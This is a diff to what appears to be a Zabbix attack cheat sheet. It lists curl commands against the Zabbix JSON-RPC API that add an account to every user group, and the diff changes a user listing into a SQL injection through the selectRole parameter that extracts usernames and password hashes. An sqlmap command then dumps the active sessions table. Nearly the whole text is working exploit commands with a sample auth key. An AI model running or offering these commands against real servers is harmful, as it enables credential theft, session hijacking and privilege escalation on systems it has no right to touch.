@@ -172,8 +172,8 @@ Example Auth Key: 97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e9
 +---------- Add Account to All Groups ----------+
 for i in {0..50}; do response=$(curl -s -X POST --url http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data "{\"jsonrpc\": \"2.0\", \"method\":\"user.update\", \"params\":{\"usrgrps\": [{\"usrgrpid\": $i}], \"userid\": \"3\"},\"auth\":\"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f\", \"id\": 3}"); [[ $response != *\"error\"* ]] && echo "Group ID: $i"; done
 
-+---------- View Users ----------+
-curl -s -X POST --url  http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params": {"output": "extend", "status": 0}, "auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f", "id": 1}' | jq
++---------- Get Users, Password Hash and RoleID ----------+
+curl -s -X POST --url  http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params": {"selectRole":["roleid, u.passwd"]}, "auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f", "id": 1}' | jq -r '.result[] | [.username, .role.passwd, .role.roleid] | @csv'
 
 +---------- Dump Active Sessions ----------+
 sqlmap -u "http://$TARGET/zabbix/api_jsonrpc.php" --data='{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f","id":1}' --headers="Content-Type: application/json-rpc" --random-agent -D zabbix -T sessions --columns --dump
